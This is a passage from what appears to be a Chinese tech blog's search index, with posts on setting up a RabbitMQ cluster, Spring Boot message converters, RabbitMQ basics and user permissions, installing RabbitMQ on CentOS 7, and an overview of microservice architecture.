的服务，以节点一为例给出下述配置示例，其他节点只需更改对应的端口号即可。值得一提的是，这里必须指定 environment=HOME=/home/rabbitmq，否则 RabbitMQ 会找不到 .erlang.cookie 而导致启动失败 12345678910111213141516[program:rabbitmq]environment=HOME=/home/rabbitmqdirectory=/usr/local/rabbitmqcommand=/usr/local/rabbitmq/sbin/rabbitmq-serveruser=rabbitmqnumprocs=1autostart=trueautorestart=truestartretries=10process_name=%(program_name)sstdout_logfile_backups=5stdout_logfile_maxbytes=10MBstdout_logfile=/var/log/supervisor/rabbitmq.logstderr_logfile_backups=5stderr_logfile_maxbytes=10MBstderr_logfile=/var/log/supervisor/rabbitmq-error.log 以节点一为例通过 Supervisor 管理 RabbitMQ 服务，其他节点不再累述 1234567891011# 关闭服务# supervisorctl stop rabbitmq# 启动服务# supervisorctl start rabbitmq# 查看服务状态# supervisorctl status rabbitmq# 重启服务# supervisorctl restart rabbitmq RabbitMQ 无法操作集群节点若执行以下命令出现下述的错误，一般是当前执行操作的用户的家目录下的 .erlang.cookie 与 集群节点的 .erlang.cookie 不一致导致。解决办法是集群节点是以哪个用户启动的，就切换到对应的用户，例如 su rabbitmq ，然后再执行集群操作命令。 12# 查看集群状态# ./rabbitmqctl cluster_status 执行集群状态查看命令，出现以下错误信息 12345678910111213141516171819202122232425262728293031Error: unable to perform an operation on node \'rabbit2@rabbitmq2\'. Please see diagnostics information and suggestions below.Most common reasons for this are: * Target node is unreachable (e.g. due to hostname resolution, TCP connection or firewall issues) * CLI tool fails to authenticate with the server (e.g. due to CLI tool\'s Erlang cookie not matching that of the server) * Target node is not runningIn addition to the diagnostics info below: * See the CLI, clustering and networking guides on https://rabbitmq.com/documentation.html to learn more * Consult server logs on node rabbit2@rabbitmq2 * If target node is configured to use long node names, don\'t forget to use --longnames with CLI toolsDIAGNOSTICS===========attempted to contact: [rabbit2@rabbitmq2]rabbit2@rabbitmq2: * connected to epmd (port 4369) on rabbitmq2 * epmd reports node \'rabbit2\' uses port 25674 for inter-node and CLI tool traffic * TCP connection succeeded but Erlang distribution failed * Authentication failed (rejected by the remote node), please check the Erlang cookieCurrent node details: * node name: \'rabbitmqcli-7936-rabbit2@rabbitmq2\' * effective user\'s home directory: /home/centos * Erlang cookie hash: 5hmDFFQNoU5sdfrafENxAg== RabbitMQ 集群配置文件概述这里以节点一为例，各个配置文件的路径如下，其他节点不再累述 123456安装目录：/usr/local/rabbitmq日志目录：/usr/local/rabbitmq/var/log/rabbitmq数据目录：/usr/local/rabbitmq/var/lib/rabbitmq/mnesia配置文件：/usr/local/rabbitmq/etc/rabbitmq/rabbitmq.config环境变量配置文件：/usr/local/rabbitmq/etc/rabbitmq/rabbitmq-env.conf服务自启动脚本：/etc/init.d/rabbitmq-cluster-15672 参考博客 RabbitMQ 集群搭建 .erlang.cookie 解惑 RabbitMQ 官方配置说明 RabbitMQ 更改默认端口 Supervior 管理 RabbitMQ 服务 RabbitMQ 使用分析和高可用集群搭建 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos"},{title:"RabbitMQ 开发随笔",url:"/posts/869a4db4.html",text:'SpringBoot 中配置 RabbitMQ 使用自定义消息转换器 业务之间大多数数据都是以 JSON 的数据格式进行传输的，即生产者服务将 JSON 类型的数据发送到对应的队列， 而消费端从队列中接收到的数据类型也是 JSON 类型，为了方便将 Java 对象转为 JSON 类型的数据来传输，此时可以使用 Spring 内置的 Jackson2JsonMessageConverter 消息转换器，具体代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667import org.springframework.amqp.rabbit.config.SimpleRabbitListenerContainerFactory;import org.springframework.amqp.rabbit.connection.ConnectionFactory;import org.springframework.amqp.rabbit.core.RabbitAdmin;import org.springframework.amqp.rabbit.core.RabbitTemplate;import org.springframework.amqp.support.converter.Jackson2JsonMessageConverter;import org.springframework.amqp.support.converter.MessageConverter;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;@Configurationpublic class RabbitMqConfig { /** * RabbitMQ的管理对象 * * @param connectionFactory * @return */ @Bean public RabbitAdmin rabbitAdmin(ConnectionFactory connectionFactory) { RabbitAdmin rabbitAdmin = new RabbitAdmin(connectionFactory); return rabbitAdmin; } /** * RabbitMq的消息转换器 * * @return */ @Bean public MessageConverter jsonMessageConverter() { Jackson2JsonMessageConverter messageConverter = new Jackson2JsonMessageConverter(); return messageConverter; } /** * RabbitMq的模版 * * @return */ @Bean public RabbitTemplate rabbitTemplate(ConnectionFactory connectionFactory, MessageConverter messageConverter) { RabbitTemplate template = new RabbitTemplate(connectionFactory); // 设置发送消息时所用的消息转换器 template.setMessageConverter(messageConverter); return template; } /** * RabbitMq的监听容器工厂 * * @return */ @Bean public SimpleRabbitListenerContainerFactory rabbitListenerContainerFactory(ConnectionFactory connectionFactory, MessageConverter messageConverter) { SimpleRabbitListenerContainerFactory factory = new SimpleRabbitListenerContainerFactory(); factory.setConnectionFactory(connectionFactory); // 设置线程数 factory.setConcurrentConsumers(3); // 最大线程数 factory.setMaxConcurrentConsumers(10); // 设置接收消息时所用的消息转换器 factory.setMessageConverter(messageConverter); return factory; }} Java 消息队列任务的平滑关闭分析 https://jaesonchen.iteye.com/blog/2342761 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"分布式 开发随笔"},{title:"RabbitMQ 入门教程之二",url:"/posts/39a63bd3.html",text:'RabbitMQ 的非阻塞 I/ONIO 通常也称非阻塞 I/O，包含三大核心部分：Channel（信道）、Buffer（缓冲区）和 Selector（选择器）。NIO 是基于 Channel 和 Buffer 进行操作的，数据总是从信道读取数据到缓冲区中，或者从缓冲区写入到信道中，而 Selector 则用于监听多个信道的时间（比如连接打开，数据到达等）。因此，单线程可以监听多个数据的信道。由于 RabbitMQ 采用类似 NIO（Non-blocking I/O）的做法，选择 TCP 连接复用，不仅可以减少性能开销，同时也便于管理。每个线程把持一个信道，所以信道复用了 Connection 的 TCP 连接。同时 RabbitMQ 可以确保每个线程的私密性，就像拥有独立的连接一样。当每个信道的流量不是很大时，复用单一的 Connection 可以在产生性能瓶颈的情况下有效地节省 TCP 连接资源。但是信道本身的流量很大时，这时候多个信道复用一个 Connection 就会产生性能瓶颈，进而使整体的流量被限制了。此时就需要开辟多个 Connection，将这些信道均摊到这些 Connection 中，至于这些相关的调优策略需要根据业务自身的实际情况进行调节。 RabbitMQ 的 ConnectionFactory、Connection、ChannelConnectionFactory、Connection、Channel 都是 RabbitMQ 对外提供的 API 中最基本的对象。Connection 是 RabbitMQ 的 Socket 连接，它封装了 Socket 协议相关部分逻辑。ConnectionFactory 是客户端与 Broker 的 TCP 连接工厂，负责根据 URI 创建 Connection。Channel 是与 RabbitMQ 打交道的最重要的一个接口，大部分的业务操作是在 Channel 这个接口中完成的，包括定义 Queue、定义 Exchange、绑定 Queue、绑定 Exchange、发布消息等。如果每一次访问 RabbitMQ 都建立一个 Connection，在消息量大的时候建立 TCP Connection 的开销将是巨大的，效率也较低。Channel 是在 Connection 内部建立的逻辑连接，如果应用程序支持多线程，通常每个 Thread 创建单独的 Channel 进行通讯，AMQP Method 包含了 Channel ID 帮助客户端和 Message Broker 识别 Channel，所以 Channel 之间是完全隔离的。Channel 作为轻量级的 Connection 极大减少了操作系统建立 TCP Connection 的开销。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"分布式"},{title:"RabbitMQ 入门教程之一",url:"/posts/be3a6fb9.html",text:'相关站点 RabbitMQ 官网 RabbitMQ 官方文档 RabbitMQ 官方教学代码 RabbitMQ 基础概念AMQP（Advanced Message Queuing Protocol）高级消息队列协议，是应用层协议的一个开放标准，为面向消息的中间件设计。消息中间件主要用于组件之间的解耦，消息的发送者无需知道消息使用者的存在，反之亦然。AMQP 的主要特征是面向消息、队列、路由（包括点对点和发布 / 订阅）、可靠性、安全。RabbitMQ 是一个开源的 AMQP 标准实现，服务器端用 Erlang 语言编写，支持多种客户端，如：Python、Ruby、C#、Java、PHP、GO、JavaScript 等。RabbitMQ 用于在分布式系统中存储转发消息，在易用性、扩展性、高可用性、灵活的路由、集群、事务、高可用的队列、消息排序、问题追踪、可视化管理工具、插件系统等方面表现不俗。 RabbitMQ 的用户角色分类 超级管理员 (administrator)，可登陆管理控制台，可查看所有的信息，并且可以对用户，策略 (policy) 进行操作 监控者 (monitoring)，可登陆管理控制台，同时可以查看 rabbitmq 节点的相关信息 (进程数，内存使用情况，磁盘使用情况等) 策略制定者 (policymaker)，可登陆管理控制台，同时可以对 policy 进行管理。但无法查看节点的相关信息，与 administrator 的对比，administrator 能看到节点信息 普通管理者 (management)，仅可登陆管理控制台，无法看到节点信息，也无法对策略进行管理 其他，无法登陆管理控制台，通常就是普通的生产者和消费者 RabbitMQ 用户与角色管理1234567891011121314151617181920212223242526# 创建超级管理员用户# rabbitmqctl add_user user_admin your_password# 赋予administrator角色给超级管理员用户# rabbitmqctl set_user_tags user_admin administrator# 创建监控用户# rabbitmqctl add_user user_monitoring your_password# 赋予monitoring角色给监控用户# rabbitmqctl set_user_tags user_monitoring monitoring# 创建某个项目的专用用户，限制只能访问自己项目的virtual hosts# rabbitmqctl add_user&nbsp;user_proj&nbsp;your_password# 赋予management给某个项目的专用用户# rabbitmqctl set_user_tags user_proj management# 查看用户与角色列表# rabbitmqctl list_users# 删除用户# rabbitmqctl delete_user user_admin# 修改用户密码# rabbitmqctl change_password user_admin your_password RabbitMQ 虚拟主机管理对 RabbitMQ 的用户角色权限进行管理时，可以将 RabbitMQ 理解为普通的数据库，其中 VHostPath 可以类比为数据库名，用户角色权限则是对指定数据库的限制访问。 12345678# 创建虚拟主机# rabbitmqctl add_vhost vhostpath# 删除虚拟主机# rabbitmqctl delete_vhost vhostpath# 列出所有虚拟主机# rabbitmqctl list_vhosts RabbitMQ 用户权限管理用户权限指的是用户对其所能访问的 VHostPath 的 exchange，queue 的操作权限，包括配置权限，读写权限。配置权限会影响到 exchange，queue 的声明和删除；读写权限影响到从 queue 里取消息，向 exchange 发送消息以及 queue 和 exchange 的绑定 (bind) 操作。例如： 将 queue 绑定到某 exchange 上，需要具有 queue 的可写权限，以及 exchange 的可读权限；向 exchange 发送消息需要具有 exchange 的可写权限；从 queue 里取数据需要具有 queue 的可读权限。详细请参考官方文档中 “How permissions work” 部分。 1234567891011121314151617# 赋予用户权限# rabbitmqctl set_permissions -p VHostPath user_admin ConfP WriteP ReadP# 赋予用户所有权限# rabbitmqctl set_permissions -p VHostPath user_admin \'.*\' \'.*\' \'.*\'# 查看VHostPath下所有用户的权限# rabbitmqctl list_permissions -p VHostPath# 查看指定用户的权限# rabbitmqctl list_user_permissions user_admin# 清除指定用户在指定VHostPath下的权限# rabbitmqctl clear_permissions -p VHostPath user_admin# 清除指定用户的所有权限# rabbitmqctl clear_permissions user_admin RabbitMQ 常用命令1234567891011# 列出所有队列# rabbitmqctl list_queues# 列出指定队列的信息# rabbitmqctl list_queues queue_name messages_ready messages_unacknowledged# 列出所有交换机# rabbitmqctl list_exchanges# 列出所有绑定# rabbitmqctl list_bindings RabbitMQ Simple Queue 模式（简单队列）简单队列模式下，每条消息只会被一个消费者所接收，不存在多个消费者接收到同一条消息的情况，而且不管有多少个消费者，默认情况下服务端都会以轮询分发（round-robin）的方式确保每个消费者接收到的消息数量是一样的。 RabbitMQ Work Queue 模式（工作队列）工作队列模式下，每条消息只会被一个消费者所接收，不存在多个消费者接收到同一条消息的情况；同时工作队列模式可以使用公平分发（fair dispatch）的方式来发送消息，特点是处理能力强的消费者可以接收到更多的消息（能者多劳），这也是与简单队列模式相比较不同的地方。当使用公平分发时，消费者可调用 basicQos（）方法，同时需要手动确认消息（ACK 机制）。 RabbitMQ Fanout 模式（发布 / 订阅）单个生产者可以对应多个消费者，每个消费者都有自己的队列，同一条消息可以被多个消费者接收。所有发送到 Fanout Exchange 的消息都会被转发到与该 Exchange 绑定 (Binding) 的所有 Queue 上。Fanout Exchange 不需要额外处理 RouteKey，只需要简单地将队列绑定到 Exchange 上，这样发送到 Exchange 的消息都会被转发到与该交换机绑定的所有队列上，作用类似子网广播，每台子网内的主机都获得了一份复制的消息，因此 Fanout Exchange 转发消息是最快的。 RabbitMQ Direct 模式（路由）单个生产者可以对应多个消费者，每个消费者都有自己的队列，同一条消息可以被多个消费者接收。所有发送到 Direct Exchange 的消息会被转发到 RouteKey 中指定的 Queue 上。消息传递时，RouteKey 必须完全匹配，才会被队列接收，否则该消息会被抛弃。 RabbitMQ Topic 模式（通配符）单个生产者可以对应多个消费者，每个消费者都有自己的队列，同一条消息可以被多个消费者接收。所有发送到 Topic Exchange 的消息会被转发到指定 Topic 的 Queue 上，Exchange 会将 RouteKey 和某个 Topic 进行模糊匹配，此时队列需要绑定一个 Topic。RouteKey 可以使用通配符进行模糊匹配，符号 # 表示匹配一个或多个词，符号 * 表示匹配不多不少一个词。因此 log.# 能够匹配到 log.info.oa，但是 log.* 只会匹配到 log.error，所以 Topic Exchange 的使用非常灵活。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"分布式"},{title:"Centos7 生产环境安装 RabbitMQ",url:"/posts/ffb541a9.html",text:'相关站点 Erlang 官方下载地址 RabbitMQ 官方下载地址 RabbitMQ 官方插件下载地址 系统环境 12CentOS Linux release 7.6.1810 (Core)Linux 3.10.0-957.5.1.el7.x86_64 #1 SMP Fri Feb 1 14:54:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 更改系统的最大打开文件描述符数 本站教程 创建 Rabbitmq 用户和用户组 12345678# 切换root用户$ sudo -i# 创建rabbitmq用户组# groupadd rabbitmq# 创建rabbitmq用户（不允许远程登录）# useradd -g rabbitmq rabbitmq -s /bin/false 编译安装 Erlang 123456789101112131415161718192021222324252627282930313233343536373839# 安装依赖# yum install -y make autoconf gcc gcc-c++ glibc-devel kernel-devel m4 ncurses-devel openssl-devel unixODBC unixODBC-devel libtool libtool-ltdl-devel unzip# 创建下载目录# mkdir -p /home/rabbitmq/software# 下载# cd /home/rabbitmq/software# wget http://erlang.org/download/otp_src_22.0.tar.gz# 解压# tar -xvf otp_src_22.0.tar.gz# 删除下载文件# rm -f otp_src_22.0.tar.gz# 创建安装目录# mkdir -p /usr/local/erlang-22.0# 进入解压目录# cd otp_src_22.0# 配置# ./otp_build autoconf# ./configure --prefix=/usr/local/erlang-22.0 --without-javac# 编译安装# make &amp;&amp; make install# 创建软链接# ln -sf /usr/local/erlang-22.0/bin/erl /usr/bin/erl# 配置环境变量# vim /etc/profileexport ERLANG_HOME=/usr/local/erlang-22.0export PATH=$PATH:$ERLANG_HOME/bin# 使环境变量生效# source /etc/profile 二进制安装 RabbitMQ 1234567891011121314151617181920212223242526# 安装依赖# yum install -y xmlto python-simplejson# 下载# wget https://github.com/rabbitmq/rabbitmq-server/releases/download/v3.7.15/rabbitmq-server-generic-unix-3.7.15.tar.xz# 解压# xz -d rabbitmq-server-generic-unix-3.7.15.tar.xz# tar -xvf rabbitmq-server-generic-unix-3.7.15.tar# 删除下载文件# rm -f rabbitmq-server-generic-unix-3.7.15.tar# 移动解压目录# mv rabbitmq_server-3.7.15 /usr/local/rabbitmq-3.7.15# 文件授权# chown -R rabbitmq:rabbitmq /usr/local/rabbitmq-3.7.15# 配置环境变量# vim /etc/profileexport RabbitMQ_HOME=/usr/local/rabbitmq-3.7.15export PATH=$PATH:$RabbitMQ_HOME/sbin# 使环境变量生效# source /etc/profile RabbitMQ 基础配置、插件安装 123456789101112131415161718192021222324252627282930# 创建默认的日志目录与数据目录# mkdir -p /usr/local/rabbitmq-3.7.15/var/log/rabbitmq# mkdir -p /usr/local/rabbitmq-3.7.15/var/lib/rabbitmq/mnesia# 创建默认的配置文件# touch /usr/local/rabbitmq-3.7.15/etc/rabbitmq/rabbitmq.config# echo "[]." &gt; /usr/local/rabbitmq-3.7.15/etc/rabbitmq/rabbitmq.config# 创建默认的环境变量文件# touch /usr/local/rabbitmq-3.7.15/etc/rabbitmq/rabbitmq-env.conf# echo "CONF_ENV_FILE=/usr/local/rabbitmq-3.7.15/etc/rabbitmq/rabbitmq-env.conf" &gt;&gt; /usr/local/rabbitmq-3.7.15/sbin/rabbitmq-defaults# 启用Web控制台管理插件，浏览器可以通过url地址（http://127.0.0.1:15672）访问Web管理界面# 默认的登录账号和密码都是guest，由于账号guest具有所有的操作权限，并且又是默认账号，出于系统安全的考虑，RabbitMQ默认限制了guest只能通过localhost登录使用# rabbitmq-plugins enable rabbitmq_management# 安装延迟队列插件# cd /usr/local/rabbitmq/plugins# wget https://dl.bintray.com/rabbitmq/community-plugins/3.7.x/rabbitmq_delayed_message_exchange/rabbitmq_delayed_message_exchange-20171201-3.7.x.zip# unzip rabbitmq_delayed_message_exchange-20171201-3.7.x.zip# rm -f rabbitmq_delayed_message_exchange-20171201-3.7.x.zip# 启用延迟队列插件# rabbitmq-plugins enable rabbitmq_delayed_message_exchange# 查看所有已安装的插件# rabbitmq-plugins list# 文件授权# chown -R rabbitmq:rabbitmq /usr/local/rabbitmq-3.7.15 RabbitMQ 创建虚拟主机与超级管理员用户，设置角色权限 12345678910111213141516171819202122232425# 上面提到过出于系统安全考虑，rabbitmq默认限制了guest只能通过localhost登录使用，因此需要手动创建管理员帐号，并更改guest用户默认的密码# 前台启动RabbitMQ服务（默认会打印出日志文件和配置文件的路径）# rabbitmq-server# 或者后台启动RabbitMQ服务# rabbitmq-server -detached# 创建虚拟主机（相当于mysql的数据库概念）# rabbitmqctl add_vhost /# 更改guest用户默认的密码# rabbitmqctl change_password guest yourPassword# 创建超级管理员用户# rabbitmqctl add_user admin yourPassword# 赋予administrator角色给超级管理员用户# rabbitmqctl set_user_tags admin administrator# 赋予超级管理员用户权限# rabbitmqctl set_permissions -p / admin \'.*\' \'.*\' \'.*\'# 彻底关闭后台启动的RabbitMQ服务# ./rabbitmqctl stop 配置防火墙 1234567891011# 配置防火墙永久开放rabbitmq的端口，其中5672是客户端通信端口，15672是web管理界面的端口，25672是server间内部通信端口，4369是erlang发现端口# firewall-cmd --zone=public --permanent --add-port=5672/tcp# firewall-cmd --zone=public --permanent --add-port=15672/tcp# firewall-cmd --zone=public --permanent --add-port=25672/tcp# firewall-cmd --zone=public --permanent --add-port=4369/tcp# 保存防火墙配置# firewall-cmd --reload# 查看防火墙已开放的端口# firewall-cmd --list-ports 开机自启动 RabbitMQ 1234567891011# 创建服务自启动脚本# touch /etc/init.d/rabbitmq-server# 更改服务自启动脚本，写入后面给出的脚本内容即可，如果是在其他系统环境里安装，只需修改脚本里的USER、MQ_HOME# vim /etc/init.d/rabbitmq-server# 服务自启动脚本授权# chmod u+x /etc/init.d/rabbitmq-server# 开机自启动# chkconfig rabbitmq-server on 管理 RabbitMQ 服务 1234567891011121314151617181920212223# 关闭服务# systemctl stop rabbitmq-server# 启动服务# systemctl start rabbitmq-server# 重启服务# systemctl restart rabbitmq-server# 查看服务状态# systemctl status rabbitmq-server# 查看运行状态# rabbitmqctl status# 循环日志文件# rabbitmqctl rotate_logs[suffix]# 重置（前提是rabbitmq已停止），从它属于的任何集群中移除，从管理数据库中移除所有数据，例如配置过的用户和虚拟宿主, 删除所有持久化的消息。# rabbitmqctl reset# 强制重置（前提是rabbitmq已停止）,force_reset命令和reset的区别是无条件重置节点，不管当前管理数据库状态以及集群的配置。如果数据库或者集群配置发生错误才使用这个最后的手段。# rabbitmqctl force_reset RabbitMQ 服务自启动脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184#!/bin/sh## rabbitmq-server RabbitMQ broker## chkconfig: - 80 05# description: Enable AMQP service provided by RabbitMQ#### BEGIN INIT INFO# Provides: rabbitmq-server# Required-Start: $remote_fs $network# Required-Stop: $remote_fs $network# Description: RabbitMQ broker# Short-Description: Enable AMQP service provided by RabbitMQ broker### END INIT INFO# Source function library.. /etc/init.d/functionsexport HOME=/home/rabbitmqPATH=/sbin:/usr/sbin:/bin:/usr/binUSER=rabbitmqNAME=rabbitmq-serverMQ_HOME=/usr/local/rabbitmq-3.7.15DAEMON=${MQ_HOME}/sbin/${NAME}CONTROL=${MQ_HOME}/sbin/rabbitmqctlROTATE_SUFFIX=DESC=rabbitmq-serverMAX_OPEN_FILES=1048576ulimit -n $MAX_OPEN_FILESSTART_PROG="daemon"PID_FILE=/var/run/rabbitmq/pidLOCK_FILE=/var/lock/subsys/$NAMEINIT_LOG_DIR=${MQ_HOME}/var/log/rabbitmqtest -x $DAEMON || exit 0test -x $CONTROL || exit 0RETVAL=0set -e[ -f /etc/default/${NAME} ] &amp;&amp; . /etc/default/${NAME}ensure_pid_dir () { PID_DIR=`dirname ${PID_FILE}` if [ ! -d ${PID_DIR} ] ; then mkdir -p ${PID_DIR} chown -R ${USER}:${USER} ${PID_DIR} chmod 755 ${PID_DIR} fi}remove_pid () { rm -f ${PID_FILE} rmdir `dirname ${PID_FILE}` || :}start_rabbitmq () { status_rabbitmq quiet if [ $RETVAL = 0 ] ; then echo RabbitMQ is currently running else RETVAL=0 ensure_pid_dir set +e RABBITMQ_PID_FILE=$PID_FILE $START_PROG $DAEMON \\ &gt; "${INIT_LOG_DIR}/startup_log" \\ 2&gt; "${INIT_LOG_DIR}/startup_err" \\ 0&lt;&amp;- &amp; $CONTROL wait $PID_FILE &gt;/dev/null 2&gt;&amp;1 RETVAL=$? set -e case "$RETVAL" in 0) echo SUCCESS if [ -n "$LOCK_FILE" ] ; then touch $LOCK_FILE fi ;; *) remove_pid echo FAILED - check ${INIT_LOG_DIR}/startup_\\{log, _err\\} RETVAL=1 ;; esac fi}stop_rabbitmq () { status_rabbitmq quiet if [ $RETVAL = 0 ] ; then set +e $CONTROL stop ${PID_FILE} &gt; ${INIT_LOG_DIR}/shutdown_log 2&gt; ${INIT_LOG_DIR}/shutdown_err RETVAL=$? set -e if [ $RETVAL = 0 ] ; then remove_pid if [ -n "$LOCK_FILE" ] ; then rm -f $LOCK_FILE fi else echo FAILED - check ${INIT_LOG_DIR}/shutdown_log, _err fi else echo RabbitMQ is not running RETVAL=0 fi}status_rabbitmq() { set +e if [ "$1" != "quiet" ] ; then $CONTROL status 2&gt;&amp;1 else $CONTROL status &gt; /dev/null 2&gt;&amp;1 fi if [ $? != 0 ] ; then RETVAL=3 fi set -e}rotate_logs_rabbitmq() { set +e $CONTROL rotate_logs ${ROTATE_SUFFIX} if [ $? != 0 ] ; then RETVAL=1 fi set -e}restart_running_rabbitmq () { status_rabbitmq quiet if [ $RETVAL = 0 ] ; then restart_rabbitmq else echo RabbitMQ is not runnning RETVAL=0 fi}restart_rabbitmq() { stop_rabbitmq start_rabbitmq}case "$1" in start) echo -n "Starting $DESC: " start_rabbitmq echo "$NAME." ;; stop) echo -n "Stopping $DESC: " stop_rabbitmq echo "$NAME." ;; status) status_rabbitmq ;; rotate-logs) echo -n "Rotating log files for $DESC: " rotate_logs_rabbitmq ;; force-reload|reload|restart) echo -n "Restarting $DESC: " restart_rabbitmq echo "$NAME." ;; try-restart) echo -n "Restarting $DESC: " restart_running_rabbitmq echo "$NAME." ;; *) echo "Usage: $0 {start|stop|status|rotate-logs|restart|condrestart|try-restart|reload|force-reload}" &gt;&amp;2 RETVAL=1 ;;esacexit $RETVAL 配置概述 123456安装目录：/usr/local/rabbitmq-3.7.15日志目录：/usr/local/rabbitmq-3.7.15/var/log/rabbitmq数据目录：/usr/local/rabbitmq-3.7.15/var/lib/rabbitmq/mnesia配置文件：/usr/local/rabbitmq-3.7.15/etc/rabbitmq/rabbitmq.config环境变量配置文件：/usr/local/rabbitmq-3.7.15/etc/rabbitmq/rabbitmq-env.conf自启动脚本：/etc/init.d/rabbitmq-server var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos"},{title:"浅析微服务架构技术",url:"/posts/6b304602.html",text:'微服务与微服务架构微服务的概述微服务理论的提出者马丁。福勒（Martin Fowler） 在其博客中详细描述了什么是微服务。微服务强调的是服务的大小，它关注的是某一个点，是具体解决某一个问题 / 提供落地对应服务的一个服务应用；狭意的看，可以看作 Eclipse 里面的一个个微服务工程 / 或者 Module。 微服务架构的概述微服务架构是一种架构模式或者说是一种架构风格，它提倡将单一应用程序划分为一组小服务，每个服务运行在自己的独立进程中，服务间通信采用轻量级通信机制 (通常是基于 HTTP 的 RESTful API)。每个服务都围绕着具体业务进行构建，并且能够被独立地部署到生产环境、类生产环境等。另外，应该尽量避免统一的、集中式的服务管理机制，对具体的一个服务而言，应根据业务上下文，选择合适的语言、工具对其进行构建，可以有一个非常轻量级的集中式管理来协调这些服务，可以使用不同的语言来编写服务，也可以使用不同的数据存储技术。 微服务架构的优缺点 优点： 易于开发和维护：一个微服务只会关注一个特定的业务功能，所以它业务清晰，代码量较少 单个微服务启动较快：单个微服务代码量较少，所以启动会比较快 业务之间松耦合，无论是在开发阶段或者部署阶段，不同的服务都是互相独立的 局部修改容易部署：单体应用只要有修改，就得重新部署整个应用，微服务解决了这样的问题 技术栈不受限：在微服务架构中，可以结合项目业务及团队的特点，合理地选择技术栈 按需伸缩：可根据需求，实现细粒度的扩展 缺点： 运维要求高：更多的服务意味着更多的运维投入 技术开发难度高：涉及到网络通信延迟、服务容错、数据一致性、系统集成测试、性能监控等 分布式固有的复杂性：使用微服务架构的是分布式系统，对于一个分布式系统，系统容错，网络延迟，分布式事务等都会带来巨大的挑战 接口调整成本高：微服务之间通过接口进行通信。如果修改某一个微服务的 API，可能所有使用了该接口的微服务都需要做调整 重复劳动：很多服务可能都会使用到相同的功能，而这个功能并没有达到分解为一个微服务的程度，这个时候，可能各个服务都会开发这一功能，从而导致代码重复 微服务项目的模块拆分示例 edu-common-parent（Maven 父配置） edu-common（公共模块） edu-common-config（公共 Config 模块） edu-common-core（公共 Core 模块） edu-common-web（公共 Web 模块） edu-facade-user（用户服务接口） edu-service-user（用户服务提供者） edu-web-boss（用户服务消费者） 传统项目与微服务项目的区别 传统的 Maven 单模块项目，最终会打包成单个 Java 或 Web 应用 传统的 Maven 多模块项目，各模块之间直接通过 Maven 依赖来实现 Java 代码的互相调用与代码重用，最终会打包成单个或多个 Java 或 Web 应用，若多个应用之间需要互相通信，则采用 TCP/HTTP 等协议，可扩展为集群架构。 微服务的 Maven 多模块项目，部分模块之间通过 Maven 依赖来实现 Java 代码的互相调用与代码重用，一般会引入注册中心来实现服务的自动注册与发现，最终会打包成多个 Java 或 Web 应用，多个应用之间通过 RPC/RESTful API 进行调用。 微服务解决方案选型服务治理框架对比 基于 Dubbo 的微服务解决方案Dubbo 